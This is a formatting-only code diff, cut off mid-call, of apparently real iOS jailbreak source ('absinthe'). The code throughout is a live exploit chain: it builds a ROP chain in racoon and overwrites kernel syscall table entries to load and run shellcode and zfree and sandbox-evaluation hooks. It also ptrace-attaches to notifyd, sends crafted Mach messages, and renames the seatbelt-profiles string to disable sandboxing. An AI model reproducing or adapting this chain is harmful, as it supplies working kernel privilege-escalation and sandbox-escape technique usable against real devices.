@@ -15,10 +15,8 @@
 
 #define offsetof(type, member) __builtin_offsetof(type, member)
 
-namespace absinthe
-{
-namespace core
-{
+namespace absinthe {
+namespace core {
 
 typedef unsigned int Addr;
 
@@ -75,7 +73,7 @@ void prepareMount(Addr vndevice, Addr mntPoint, char* vnimage)
 
     ropLoadReg0Const(newString(vnimage));
     ropSaveReg0(vn + 0x00); // vn.vn_file
-    ropLoadReg0Const((int)vncontrol_readwrite_io_e);
+    ropLoadReg0Const((int) vncontrol_readwrite_io_e);
     ropSaveReg0(vn + 0x08); // vn.vn_control
 
     ropLoadReg0(ptrFd);
@@ -111,8 +109,7 @@ void _remountroot()
 
     ropLoadReg0Const(0);
     int i;
-    for (i = 0; i < (sizeof(struct hfs_mount_args) / 4); ++i)
-    {
+    for (i = 0; i < (sizeof(struct hfs_mount_args) / 4); ++i) {
         ropSaveReg0(remountArgs + (0x4 * i));
     }
 
@@ -124,8 +121,8 @@ void _remountroot()
     ropCall4(dscs + offsets->_dsc_mount, p1, p2, MNT_UPDATE, remountArgs);
 
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c);
-    ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("* mount returned: %d"),
-             PLACE_HOLDER);
+    ropCall3(
+        dscs + offsets->_dsc_syslog, LOG_WARNING, newString("* mount returned: %d"), PLACE_HOLDER);
 }
 
 void bootstrap()
@@ -169,176 +166,162 @@ void bootstrap()
     unsigned int sysentRestore[0x80];
     snprintf(fileName, sizeof(fileName), "%s/sysent_1c50", dataPath);
     f = fopen(fileName, "rb");
-    if (f)
-    {
+    if (f) {
         fread(&sysentRestore[0], 4, 0x80, f);
         fclose(f);
-    }
-    else
-    {
+    } else {
         fprintf(stderr, "Error opening '%s'", fileName);
     }
-    for (j = 0; j < 0x80; j++)
-    {
+    for (j = 0; j < 0x80; j++) {
         sysentRestore[j] = le32toh(sysentRestore[j]);
     }
     // quick syscall restore
-    for (j = 0; j < 0x2b; j++)
-    {
-        ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + (j << 2) - 4,
-                 sysentRestore[j]); // -4 because of the gadget doing a str [rx, #4]
+    for (j = 0; j < 0x2b; j++) {
+        ropCall3(
+            dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + (j << 2) - 4,
+            sysentRestore[j]); // -4 because of the gadget doing a str [rx, #4]
     }
-    for (j = 0x31; j < 0x80; j += 6)
-    {
-        ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + (j << 2) - 4,
-                 sysentRestore[j]);
+    for (j = 0x31; j < 0x80; j += 6) {
+        ropCall3(
+            dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + (j << 2) - 4,
+            sysentRestore[j]);
     }
-    ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x1f8 - 4,
-             sysentRestore[0x1f8 >> 2]);
+    ropCall3(
+        dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x1f8 - 4,
+        sysentRestore[0x1f8 >> 2]);
 
     // zfree hooker
     snprintf(fileName, sizeof(fileName), "%s/zfreehooker.bin", dataPath);
     f = fopen(fileName, "rb");
-    if (f)
-    {
+    if (f) {
         fseek(f, 0, SEEK_END);
         len = ftell(f);
         fseek(f, 0, SEEK_SET);
         unsigned int zfreehooker[len >> 2];
         fread(&zfreehooker[0], 4, len >> 2, f);
         fclose(f);
-        for (j = 0; j < (len >> 2); j++)
-        {
+        for (j = 0; j < (len >> 2); j++) {
             zfreehooker[j] = le32toh(zfreehooker[j]);
-            ropCall3(dscs + offsets->_dsc_syscall, 309, ZFREEHOOKER_ADDR + (j << 2) - 4,
-                     zfreehooker[j]);
+            ropCall3(
+                dscs + offsets->_dsc_syscall, 309, ZFREEHOOKER_ADDR + (j << 2) - 4, zfreehooker[j]);
         }
-    }
-    else
-    {
+    } else {
         fprintf(stderr, "Error opening '%s'", fileName);
     }
 
     // zfree hook
     snprintf(fileName, sizeof(fileName), "%s/zfreehook.bin", dataPath);
     f = fopen(fileName, "rb");
-    if (f)
-    {
+    if (f) {
         fseek(f, 0, SEEK_END);
         len = ftell(f);
         fseek(f, 0, SEEK_SET);
         unsigned int zfreehook[len >> 2];
         fread(&zfreehook[0], 4, len >> 2, f);
         fclose(f);
-        for (j = 0; j < (len >> 2); j++)
-        {
+        for (j = 0; j < (len >> 2); j++) {
             zfreehook[j] = le32toh(zfreehook[j]);
-            ropCall3(dscs + offsets->_dsc_syscall, 309, ZFREEHOOK_ADDR + (j << 2) - 4,
-                     zfreehook[j]);
+            ropCall3(
+                dscs + offsets->_dsc_syscall, 309, ZFREEHOOK_ADDR + (j << 2) - 4, zfreehook[j]);
         }
-    }
-    else
-    {
+    } else {
         fprintf(stderr, "Error opening '%s'", fileName);
     }
 
     // invalidate all dcache
-    ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x94 - 4,
-             offsets->FLUSH_DCACHE_ALL);
+    ropCall3(
+        dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x94 - 4,
+        offsets->FLUSH_DCACHE_ALL);
     ropCall3(dscs + offsets->_dsc_syscall, 308, USELESS, USELESS);
     // invalidate all icache
-    ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x94 - 4,
-             offsets->INVALIDATE_ICACHE_ALL);
+    ropCall3(
+        dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x94 - 4,
+        offsets->INVALIDATE_ICACHE_ALL);
     ropCall3(dscs + offsets->_dsc_syscall, 308, USELESS, USELESS);
 
     // shellcode copy
     snprintf(fileName, sizeof(fileName), "%s/shellcode.bin", dataPath);
     f = fopen(fileName, "rb");
-    if (f)
-    {
+    if (f) {
         fseek(f, 0, SEEK_END);
         len = ftell(f);
         fseek(f, 0, SEEK_SET);
         unsigned int shellcode[len >> 2];
         fread(&shellcode[0], 4, len >> 2, f);
         fclose(f);
-        for (j = 0; j < (len >> 2); j++)
-        {
+        for (j = 0; j < (len >> 2); j++) {
             shellcode[j] = le32toh(shellcode[j]);
-            ropCall3(dscs + offsets->_dsc_syscall, 309, SHELLCODE_ADDR + (j << 2) - 4,
-                     shellcode[j]);
+            ropCall3(
+                dscs + offsets->_dsc_syscall, 309, SHELLCODE_ADDR + (j << 2) - 4, shellcode[j]);
         }
-    }
-    else
-    {
+    } else {
         fprintf(stderr, "Error opening '%s'", fileName);
     }
 
     // sb_evaluate hooker
     snprintf(fileName, sizeof(fileName), "%s/sb_evaluatehooker.bin", dataPath);
     f = fopen(fileName, "rb");
-    if (f)
-    {
+    if (f) {
         fseek(f, 0, SEEK_END);
         len = ftell(f);
         fseek(f, 0, SEEK_SET);
         unsigned int sb_evaluatehooker[len >> 2];
         fread(&sb_evaluatehooker[0], 4, len >> 2, f);
         fclose(f);
-        for (j = 0; j < (len >> 2); j++)
-        {
+        for (j = 0; j < (len >> 2); j++) {
             sb_evaluatehooker[j] = le32toh(sb_evaluatehooker[j]);
-            ropCall3(dscs + offsets->_dsc_syscall, 309, SB_EVALUATEHOOKER_ADDR + (j << 2) - 4,
-                     sb_evaluatehooker[j]);
+            ropCall3(
+                dscs + offsets->_dsc_syscall, 309, SB_EVALUATEHOOKER_ADDR + (j << 2) - 4,
+                sb_evaluatehooker[j]);
         }
-    }
-    else
-    {
+    } else {
         fprintf(stderr, "Error opening '%s'", fileName);
     }
 
     // sb_evaluate hook
     snprintf(fileName, sizeof(fileName), "%s/sb_evaluatehook.bin", dataPath);
     f = fopen(fileName, "rb");
-    if (f)
-    {
+    if (f) {
         fseek(f, 0, SEEK_END);
         len = ftell(f);
         fseek(f, 0, SEEK_SET);
         unsigned int sb_evaluatehook[len >> 2];
         fread(&sb_evaluatehook[0], 4, len >> 2, f);
         fclose(f);
-        for (j = 0; j < (len >> 2); j++)
-        {
+        for (j = 0; j < (len >> 2); j++) {
             sb_evaluatehook[j] = le32toh(sb_evaluatehook[j]);
-            ropCall3(dscs + offsets->_dsc_syscall, 309, SB_EVALUATEHOOK_ADDR + (j << 2) - 4,
-                     sb_evaluatehook[j]);
+            ropCall3(
+                dscs + offsets->_dsc_syscall, 309, SB_EVALUATEHOOK_ADDR + (j << 2) - 4,
+                sb_evaluatehook[j]);
         }
-    }
-    else
-    {
+    } else {
         fprintf(stderr, "Error opening '%s'", fileName);
     }
 
     // invalidate all dcache
-    ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x94 - 4,
-             offsets->FLUSH_DCACHE_ALL);
+    ropCall3(
+        dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x94 - 4,
+        offsets->FLUSH_DCACHE_ALL);
     ropCall3(dscs + offsets->_dsc_syscall, 308, USELESS, USELESS);
     // invalidate all icache
-    ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x94 - 4,
-             offsets->INVALIDATE_ICACHE_ALL);
+    ropCall3(
+        dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x94 - 4,
+        offsets->INVALIDATE_ICACHE_ALL);
     ropCall3(dscs + offsets->_dsc_syscall, 308, USELESS, USELESS);
 
     // shellcode execute
-    ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x94 - 4,
-             SHELLCODE_ADDR + 1); // changes syscall 308 to the shellcode
+    ropCall3(
+        dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x94 - 4,
+        SHELLCODE_ADDR + 1); // changes syscall 308 to the shellcode
     ropCall3(dscs + offsets->_dsc_syscall, 308, USELESS, USELESS); // executes it
 
     // syscall restore
-    ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x94 - 4,
-             sysentRestore[0x94 >> 2]);
-    ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0xac - 4,
-             sysentRestore[0xac >> 2]);
+    ropCall3(
+        dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x94 - 4,
+        sysentRestore[0x94 >> 2]);
+    ropCall3(
+        dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0xac - 4,
+        sysentRestore[0xac >> 2]);
 
     // - unmount everything
     _unmount(vndevice0, mntPoint0);
@@ -360,16 +343,17 @@ void exploit()
     ropLog("Entering racoon ROP.");
 
     Addr aShmBaseAddress = newInteger(0);
-    ropCall3(dscs + offsets->_dsc_shm_open, newString("apple.shm.notification_center"),
-             O_RDWR | O_CREAT, 0644);
+    ropCall3(
+        dscs + offsets->_dsc_shm_open, newString("apple.shm.notification_center"), O_RDWR | O_CREAT,
+        0644);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x24); // shm fd to PLACE_HOLDER
-    ropCall7(dscs + offsets->_dsc_mmap, 0, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, PLACE_HOLDER,
-             0, 0);
+    ropCall7(
+        dscs + offsets->_dsc_mmap, 0, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, PLACE_HOLDER, 0, 0);
     ropAddReg0Const(0xF00);
     ropSaveReg0(aShmBaseAddress);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aPid to PLACE_HOLDER
-    ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("shmBaseAddress: %x"),
-             PLACE_HOLDER);
+    ropCall3(
+        dscs + offsets->_dsc_syslog, LOG_WARNING, newString("shmBaseAddress: %x"), PLACE_HOLDER);
 
     Addr aStat = newInteger(0);
     Addr aSize = newInteger(0);
@@ -385,8 +369,9 @@ void exploit()
     ropSaveReg0(aRacoonSrcFd);
 
     ropLoadReg0(aStat);
-    ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
-                0x08); // stat to second PLACE_HOLDER
+    ropSaveReg0(
+        ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
+        0x08); // stat to second PLACE_HOLDER
     ropLoadReg0(aRacoonSrcFd);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonSrcFd to PLACE_HOLDER
     ropCall2(dscs + offsets->_dsc_fstat, PLACE_HOLDER, PLACE_HOLDER);
@@ -397,8 +382,9 @@ void exploit()
     ropSaveReg0(aSize);
 
     ropLoadReg0(aSize);
-    ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
-                0x08); // st.st_size to first PLACE_HOLDER
+    ropSaveReg0(
+        ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
+        0x08); // st.st_size to first PLACE_HOLDER
     ropLoadReg0(aRacoonSrcFd);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x24); // racoonSrcFd to second PLACE_HOLDER
     ropCall7(dscs + offsets->_dsc_mmap, 0, PLACE_HOLDER, PROT_READ, MAP_SHARED, PLACE_HOLDER, 0, 0);
@@ -412,53 +398,63 @@ void exploit()
     ropSaveReg0(aRacoonDstFd);
 
     ropLoadReg0(aSize);
-    ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
-                0x08); // st.st_size to second PLACE_HOLDER
+    ropSaveReg0(
+        ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
+        0x08); // st.st_size to second PLACE_HOLDER
     ropLoadReg0(aRacoonDstFd);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonDstFd to first PLACE_HOLDER
     ropCall3(dscs + offsets->_dsc_ftruncate, PLACE_HOLDER, PLACE_HOLDER, 0);
 
     ropLoadReg0(aSize);
-    ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
-                0x08); // st.st_size to first PLACE_HOLDER
+    ropSaveReg0(
+        ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
+        0x08); // st.st_size to first PLACE_HOLDER
     ropLoadReg0(aRacoonDstFd);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x24); // racoonDstFd to second PLACE_HOLDER
-    ropCall7(dscs + offsets->_dsc_mmap, 0, PLACE_HOLDER, PROT_READ | PROT_WRITE, MAP_SHARED,
-             PLACE_HOLDER, 0, 0);
+    ropCall7(
+        dscs + offsets->_dsc_mmap, 0, PLACE_HOLDER, PROT_READ | PROT_WRITE, MAP_SHARED,
+        PLACE_HOLDER, 0, 0);
     ropSaveReg0(aRacoonDst);
 
     ropLoadReg0(aSize);
-    ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
-                ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x0c); // st.st_size to third PLACE_HOLDER
+    ropSaveReg0(
+        ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
+        ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x0c); // st.st_size to third PLACE_HOLDER
     ropLoadReg0(aRacoonSrc);
-    ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
-                0x08); // racoonSrc to second PLACE_HOLDER
+    ropSaveReg0(
+        ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
+        0x08); // racoonSrc to second PLACE_HOLDER
     ropLoadReg0(aRacoonDst);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonDst to first PLACE_HOLDER
     ropCall3(dscs + offsets->_dsc_memcpy, PLACE_HOLDER, PLACE_HOLDER, PLACE_HOLDER);
 
     ropLoadReg0(aSize);
-    ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
-                0x08); // st.st_size to second PLACE_HOLDER
+    ropSaveReg0(
+        ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
+        0x08); // st.st_size to second PLACE_HOLDER
     ropLoadReg0(aRacoonDst);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonDst to first PLACE_HOLDER
-    ropCall4(dscs + offsets->_dsc_memmem, PLACE_HOLDER, PLACE_HOLDER,
-             newString("seatbelt-profiles"), sizeof("seatbelt-profiles") - 1);
+    ropCall4(
+        dscs + offsets->_dsc_memmem, PLACE_HOLDER, PLACE_HOLDER, newString("seatbelt-profiles"),
+        sizeof("seatbelt-profiles") - 1);
 
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // profiles_loc to PLACE_HOLDER
-    ropCall3(dscs + offsets->_dsc_memcpy, PLACE_HOLDER, newString("seatbelt-profil3s"),
-             sizeof("seatbelt-profil3s") - 1);
+    ropCall3(
+        dscs + offsets->_dsc_memcpy, PLACE_HOLDER, newString("seatbelt-profil3s"),
+        sizeof("seatbelt-profil3s") - 1);
 
     ropLoadReg0(aSize);
-    ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
-                0x08); // st.st_size to second PLACE_HOLDER
+    ropSaveReg0(
+        ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
+        0x08); // st.st_size to second PLACE_HOLDER
     ropLoadReg0(aRacoonSrc);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonSrc to first PLACE_HOLDER
     ropCall2(dscs + offsets->_dsc_munmap, PLACE_HOLDER, PLACE_HOLDER);
 
     ropLoadReg0(aSize);
-    ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
-                0x08); // st.st_size to second PLACE_HOLDER
+    ropSaveReg0(
+        ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
+        0x08); // st.st_size to second PLACE_HOLDER
     ropLoadReg0(aRacoonDst);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonDst to first PLACE_HOLDER
     ropCall2(dscs + offsets->_dsc_munmap, PLACE_HOLDER, PLACE_HOLDER);
@@ -490,12 +486,12 @@ void exploit()
 
     // ropMemmem(aProc, aLength, "\0\0notifyd", 9);
     ropLoadReg0(aProc);
-    ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN * 2 + ROP_LOAD_REG0_LEN +
-                0x04); // aProc to PLACE_HOLDER1
+    ropSaveReg0(
+        ropWriteAddr + ROP_SAVE_REG0_LEN * 2 + ROP_LOAD_REG0_LEN + 0x04); // aProc to PLACE_HOLDER1
     ropLoadReg0(aLength);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aLength to PLACE_HOLDER2
-    ropCall4(dscs + offsets->_dsc_memmem, PLACE_HOLDER, PLACE_HOLDER, newBinary("\0\0notifyd", 9),
-             9);
+    ropCall4(
+        dscs + offsets->_dsc_memmem, PLACE_HOLDER, PLACE_HOLDER, newBinary("\0\0notifyd", 9), 9);
 
     ropSubReg0Const(137);
     ropDerefReg0();
@@ -510,22 +506,23 @@ void exploit()
     Addr aRegions = newBuffer(sizeof(uint32_t) * 44 * 3);
     Addr aRegionInfo = newBuffer(sizeof(struct proc_regionwithpathinfo));
     int i;
-    for (i = 0; i < 44; ++i)
-    {
+    for (i = 0; i < 44; ++i) {
         ropLoadReg0(aPid);
-        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
-                    0x04); // aPid to first PLACE_HOLDER
+        ropSaveReg0(
+            ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
+            0x04); // aPid to first PLACE_HOLDER
         ropLoadReg0(aRegion);
         ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aRegion to second PLACE_HOLDER
-        ropCall6(dscs + offsets->_dsc_proc_pidinfo, PLACE_HOLDER, PROC_PIDREGIONPATHINFO,
-                 PLACE_HOLDER, 0, aRegionInfo, sizeof(struct proc_regionwithpathinfo));
+        ropCall6(
+            dscs + offsets->_dsc_proc_pidinfo, PLACE_HOLDER, PROC_PIDREGIONPATHINFO, PLACE_HOLDER,
+            0, aRegionInfo, sizeof(struct proc_regionwithpathinfo));
         ropLoadReg0(aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_address));
         ropSaveReg0(aRegions + (sizeof(uint32_t) * ((i * 3) + 0)));
-        ropLoadReg0(aRegionInfo +
-                    offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_protection));
+        ropLoadReg0(
+            aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_protection));
         ropSaveReg0(aRegions + (sizeof(uint32_t) * ((i * 3) + 1)));
-        ropLoadReg0(aRegionInfo +
-                    offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_share_mode));
+        ropLoadReg0(
+            aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_share_mode));
         ropSaveReg0(aRegions + (sizeof(uint32_t) * ((i * 3) + 2)));
         ropLoadReg0(aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_size));
         ropMovReg1Reg0();
@@ -536,8 +533,8 @@ void exploit()
 
     uint32_t search[2] = {(PROT_READ | PROT_WRITE), SM_SHARED};
     Addr aSearch = newArray(search, 2);
-    ropCall4(dscs + offsets->_dsc_memmem, aRegions, sizeof(uint32_t) * 44 * 3, aSearch,
-             sizeof(search));
+    ropCall4(
+        dscs + offsets->_dsc_memmem, aRegions, sizeof(uint32_t) * 44 * 3, aSearch, sizeof(search));
     ropSubReg0Const(sizeof(uint32_t));
     ropDerefReg0();
     ropAddReg0Const(0xF00);
@@ -545,17 +542,20 @@ void exploit()
 
     // ropBootstrapLookUp(bootstrap_port, "com.apple.system.notification_center", port);
     Addr aPort = newInteger(0);
-    ropCall2(dscs + offsets->_dsc_dlsym, (uint32_t)((intptr_t)RTLD_DEFAULT),
-             newString("bootstrap_port"));
+    ropCall2(
+        dscs + offsets->_dsc_dlsym, (uint32_t) ((intptr_t) RTLD_DEFAULT),
+        newString("bootstrap_port"));
     ropDerefReg0();
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // bootstrap_port to PLACE_HOLDER
-    ropCall3(dscs + offsets->_dsc_bootstrap_look_up, PLACE_HOLDER,
-             newString("com.apple.system.notification_center"), aPort);
+    ropCall3(
+        dscs + offsets->_dsc_bootstrap_look_up, PLACE_HOLDER,
+        newString("com.apple.system.notification_center"), aPort);
 
     ropLoadReg0(aPort);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aPid to PLACE_HOLDER
-    ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING,
-             newString("Looked up notification center: %p"), PLACE_HOLDER);
+    ropCall3(
+        dscs + offsets->_dsc_syslog, LOG_WARNING, newString("Looked up notification center: %p"),
+        PLACE_HOLDER);
 
     // ropPtrace(PT_ATTACH, aPid, 0, 0);
     ropLoadReg0(aPid);
@@ -570,8 +570,9 @@ void exploit()
     // ropPtrace(PT_CONTINUE, aPid, aAddr, 0);
     ropLoadReg0(aPid);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aPid to PLACE_HOLDER
-    ropCall4(dscs + offsets->_dsc_ptrace, PT_CONTINUE, PLACE_HOLDER,
-             dscs + offsets->_dsc_bsdthread_terminate, 0);
+    ropCall4(
+        dscs + offsets->_dsc_ptrace, PT_CONTINUE, PLACE_HOLDER,
+        dscs + offsets->_dsc_bsdthread_terminate, 0);
     ropLog("continuing...");
 
     // ropPtrace(PT_DETACH, aPid, 0, 0); // please???
@@ -589,17 +590,20 @@ void exploit()
     ropCall0(dscs + offsets->_dsc_mach_task_self);
     ropSaveReg0(aTaskPort);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // taskPort to PLACE_HOLDER
-    ropCall3(dscs + offsets->_dsc_mach_port_allocate, PLACE_HOLDER, MACH_PORT_RIGHT_RECEIVE,
-             aLocalPort);
+    ropCall3(
+        dscs + offsets->_dsc_mach_port_allocate, PLACE_HOLDER, MACH_PORT_RIGHT_RECEIVE, aLocalPort);
     ropLoadReg0(aTaskPort);
-    ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
-                ROP_SAVE_REG0_LEN + 0x04); // taskPort to first PLACE_HOLDER
+    ropSaveReg0(
+        ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN +
+        ROP_SAVE_REG0_LEN + 0x04); // taskPort to first PLACE_HOLDER
     ropLoadReg0(aLocalPort);
-    ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_SAVE_REG0_LEN +
-                0x08);                                    // localPort to second PLACE_HOLDER
+    ropSaveReg0(
+        ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_SAVE_REG0_LEN +
+        0x08);                                            // localPort to second PLACE_HOLDER
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // localPort to third PLACE_HOLDER
-    ropCall4(dscs + offsets->_dsc_mach_port_insert_right, PLACE_HOLDER, PLACE_HOLDER, PLACE_HOLDER,
-             MACH_MSG_TYPE_MAKE_SEND);
+    ropCall4(
+        dscs + offsets->_dsc_mach_port_insert_right, PLACE_HOLDER, PLACE_HOLDER, PLACE_HOLDER,
+        MACH_MSG_TYPE_MAKE_SEND);
 
     ropLoadReg0(aLocalPort);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aPid to PLACE_HOLDER
@@ -623,18 +627,24 @@ void exploit()
     ropLoadReg0(aShmAddress);
     ropSaveReg0(aMsg + offsetof(struct trojan_msg, r4));
 
-    ropCall7(dscs + offsets->_dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL,
-             5000, MACH_PORT_NULL);
-    ropCall7(dscs + offsets->_dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL,
-             5000, MACH_PORT_NULL);
-    ropCall7(dscs + offsets->_dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL,
-             5000, MACH_PORT_NULL);
-    ropCall7(dscs + offsets->_dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL,
-             5000, MACH_PORT_NULL);
-    ropCall7(dscs + offsets->_dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL,
-             5000, MACH_PORT_NULL);
-    ropCall7(dscs + offsets->_dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL,
-             5000, MACH_PORT_NULL);
+    ropCall7(
+        dscs + offsets->_dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000,
+        MACH_PORT_NULL);
+    ropCall7(
+        dscs + offsets->_dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000,
+        MACH_PORT_NULL);
+    ropCall7(
+        dscs + offsets->_dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000,
+        MACH_PORT_NULL);
+    ropCall7(
+        dscs + offsets->_dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000,
+        MACH_PORT_NULL);
+    ropCall7(
+        dscs + offsets->_dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000,
+        MACH_PORT_NULL);
+    ropCall7(
+        dscs + offsets->_dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000,
+        MACH_PORT_NULL);
 
     // ropPtrace(PT_ATTACH, aPid, 0, 0);
     ropLoadReg0(aPid);
@@ -668,26 +678,26 @@ void exploit()
     ropAddReg0Const(sizeof("load"));
     ropSaveReg0(aRacoonStringArg2Address);
 
-    ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x0C,
-                                             dscs + offsets->GADGET_MOV_LR_R4_MOV_R0_LR_POP47);
-    ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x1C,
-                                             dscs + offsets->GADGET_MOV_LR_R4_MOV_R0_LR_POP47);
+    ropStoreValueAtOffsetFromVariableAddress(
